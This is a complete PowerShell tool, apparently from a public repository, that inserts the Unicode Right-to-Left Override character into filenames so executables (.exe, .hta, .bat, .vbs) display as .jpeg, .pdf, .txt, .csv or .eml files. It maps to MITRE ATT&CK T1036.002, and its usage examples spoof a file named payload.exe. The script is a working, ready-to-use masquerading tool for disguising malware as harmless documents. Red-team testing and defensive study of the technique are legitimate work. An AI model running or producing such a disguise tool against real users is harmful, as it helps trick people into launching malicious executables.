<#
.SYNOPSIS
Right-to-Left Override (RTLO) extension spoofing file renamer.

.DESCRIPTION
Memento-RTLO renames or copies executable files so that their displayed
extension appears benign while the underlying filesystem entry and
operating-system behavior remain unchanged.

The tool inserts the Unicode Right-to-Left Override control character
(U+202E) into the filename at a calculated position. The Unicode
Bidirectional Algorithm (UAX #9) then causes every subsequent character
to be rendered in reverse visual order. The result is that a file whose
real extension is, for example, .exe appears on screen as .jpeg or .pdf.

Supported real extensions: .exe, .hta, .bat, .vbs.
Supported spoof extensions: jpeg, pdf, jpg, txt, csv, eml.

The technique corresponds to MITRE ATT&CK sub-technique T1036.002
(Masquerading: Right-to-Left Override).

.PARAMETER --file
Path to the executable file to spoof. Required.

.PARAMETER --choice
Index of the spoof pattern to apply (see --show-list). If omitted, an
interactive menu is displayed.

.PARAMETER --replace
When specified, the original file is renamed in-place. By default, a
copy is created alongside the original.

.PARAMETER --show-list
Prints every available name/extension pair grouped by real extension
and exits.

.PARAMETER --help
Displays usage information and exits. Also accepts /help and -help.

.EXAMPLE
PS C:\> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process
PS C:\> .\MementoRTLO.ps1 --file "C:\lab\payload.exe" --choice 2

Creates a copy of payload.exe whose displayed filename appears to end
with .pdf thanks to the RTLO character injection.

.EXAMPLE
PS C:\> .\MementoRTLO.ps1 --file "C:\lab\payload.exe" --choice 1 --replace

Renames payload.exe in-place so its displayed filename shows .jpeg.

.EXAMPLE
PS C:\> .\MementoRTLO.ps1 --show-list

Lists all available spoof patterns (name + fake extension) for every
supported real extension.

.NOTES
Author   : Franck FERMAN
Version  : 2.0.0
License  : GNU AGPLv3
GitHub   : https://github.com/franckferman/Memento-RTLO

.LINK
https://github.com/franckferman/Memento-RTLO
#>


# ---------------------------------------------------------------------------
# RTLO Unicode control character (U+202E, UTF-8: E2 80 AE).
# Inserting this character into a filename causes the bidi rendering engine
# to display all subsequent characters in reverse visual order.
# ---------------------------------------------------------------------------
$RTLO = [char]0x202E


# ---------------------------------------------------------------------------
# Spoof association table.
# Each real extension maps to an array of hashtables containing a display
# name and a fake extension. When applied, the fake extension is reversed
# and appended after the RTLO character so that the bidi algorithm renders
# it in the expected (unreversed) reading order.
# ---------------------------------------------------------------------------
$Associations = @{
    '.exe' = @(
        @{ Name = 'Annexe'; Extension = 'jpeg' },
        @{ Name = 'Document'; Extension = 'pdf' }
    )
    '.hta' = @(
        @{ Name = 'Info'; Extension = 'jpg' },
        @{ Name = 'Fichier'; Extension = 'txt' }
    )
    '.bat' = @(
        @{ Name = 'Note'; Extension = 'txt' },
        @{ Name = 'Liste'; Extension = 'csv' }
    )
    '.vbs' = @(
        @{ Name = 'Script'; Extension = 'txt' },
        @{ Name = 'Email'; Extension = 'eml' }
    )
}


# ---------------------------------------------------------------------------
# Show-Banner
# Prints the tool banner to the console.
# ---------------------------------------------------------------------------
function Show-Banner {
    Write-Host "==============================================="
    Write-Host "    Memento - RTLO File Extension Spoofing Tool"
    Write-Host "==============================================="
}


# ---------------------------------------------------------------------------
# Show-Help
# Prints a usage summary including all available command-line options,
# then terminates the script.
# ---------------------------------------------------------------------------
function Show-Help {
    Show-Banner
    Write-Host ""
    Write-Host "Usage:"
    Write-Host "  .\MementoRTLO.ps1 --file <path> [--choice <number>] [--replace]"
    Write-Host ""
    Write-Host "Options:"
    Write-Host "  --file <path>          Path to file to spoof."
    Write-Host "  --choice <number>      Pick spoof pattern (index from --show-list)."
    Write-Host "  --replace              Replace the file (default is to copy)."
    Write-Host "  --show-list            List available spoof patterns."
    Write-Host "  /help, --help, -help   Show help."
    Write-Host ""
    exit
}


# ---------------------------------------------------------------------------
# Show-List
# Enumerates all spoof patterns from the association table, grouped by
# real extension, with a sequential index for use with --choice.
# ---------------------------------------------------------------------------
function Show-List {
    Write-Host "Available name/extension pairs by file type:"
    $i = 1
    foreach ($ext in $Associations.Keys) {
        Write-Host "`n[$ext]"
        foreach ($item in $Associations[$ext]) {
            Write-Host "  [$i] $($item.Name).$($item.Extension)"
            $i++
        }
    }
    exit
}


# ---------------------------------------------------------------------------
# Argument parsing.
# Supports --file, --choice, --replace, --show-list, and help flags.
# Unknown arguments are reported with a warning.
# ---------------------------------------------------------------------------
$Params = @{
    File = $null
    Choice = $null
    Replace = $false
    ShowList = $false
}


for ($i = 0; $i -lt $args.Count; $i++) {
    switch -regex ($args[$i]) {
        '^(/help|--help|-help)$' { Show-Help }
        '^--file$' { $Params.File = $args[++$i] }
        '^--choice$' { $Params.Choice = [int]$args[++$i] }
        '^--replace$' { $Params.Replace = $true }
        '^--show-list$' { $Params.ShowList = $true }
        default { Write-Host "Unknown argument: $($args[$i])" -ForegroundColor Yellow }
    }
}


if ($Params.ShowList) { Show-List }


# ---------------------------------------------------------------------------
# Input validation.
# ---------------------------------------------------------------------------
if (-not $Params.File) {
    Write-Host "Error: Please specify a file path using --file." -ForegroundColor Red
    exit 1
}


if (-not (Test-Path $Params.File)) {
    Write-Host "Error: File not found: $($Params.File)" -ForegroundColor Red
    exit 1
}


$FileExt = [System.IO.Path]::GetExtension($Params.File).ToLower()
if (-not $Associations.ContainsKey($FileExt)) {
    Write-Host "Error: Unsupported extension '$FileExt'. Supported: .exe, .hta, .bat, .vbs." -ForegroundColor Red
    exit 1
}


# ---------------------------------------------------------------------------
# Pattern selection.
# If --choice was provided, validate and use it directly. Otherwise,
# present an interactive menu and wait for user input.
# ---------------------------------------------------------------------------
$Pairs = $Associations[$FileExt]


if ($Params.Choice) {
    if ($Params.Choice -le 0 -or $Params.Choice -gt $Pairs.Count) {
        Write-Host "Invalid choice. Use --show-list to see options." -ForegroundColor Red
        exit 1
    }
    $Selected = $Pairs[$Params.Choice - 1]
} else {
    Write-Host "`nSelect name/extension pair:"
    for ($i = 0; $i -lt $Pairs.Count; $i++) {
        Write-Host "[$($i + 1)] $($Pairs[$i].Name).$($Pairs[$i].Extension)"
    }
    $sel = Read-Host "Enter choice"
    if (-not ($sel -as [int]) -or $sel -lt 1 -or $sel -gt $Pairs.Count) {
        Write-Host "Invalid input." -ForegroundColor Red
        exit 1
    }
    $Selected = $Pairs[$sel - 1]
}


# ---------------------------------------------------------------------------
# Filename construction.
#
# Logical structure:
#   <DisplayName> + U+202E + reverse(<SpoofExtension>) + <RealExtension>
#
# The bidi algorithm renders reverse(<SpoofExtension>) + <RealExtension>
# right-to-left, so the user sees:
#   <DisplayName> <RealExtWithoutDot>.<SpoofExtension>
#
# Example for payload.exe spoofed as Annexe.jpeg:
#   Logical bytes:  A n n e x e [U+202E] g e p j . e x e
#   Visual render:  Annexe exe.jpeg
# ---------------------------------------------------------------------------
$BaseName = $Selected.Name
$SpoofExt = $Selected.Extension
$ReversedExt = -join ($SpoofExt.ToCharArray())[-1..-($SpoofExt.Length)]
$NewFileName = "$BaseName$RTLO$ReversedExt$FileExt"


# ---------------------------------------------------------------------------
# File operation: copy (default) or rename (--replace).
# ---------------------------------------------------------------------------
$NewPath = [System.IO.Path]::Combine((Get-Item $Params.File).DirectoryName, $NewFileName)
Show-Banner
if ($Params.Replace) {
    Rename-Item -Path $Params.File -NewName $NewFileName
    Write-Host "File renamed as: $NewFileName"
} else {
    Copy-Item -Path $Params.File -Destination $NewPath
    Write-Host "File copied as: $NewFileName"
}
Write-Host ""
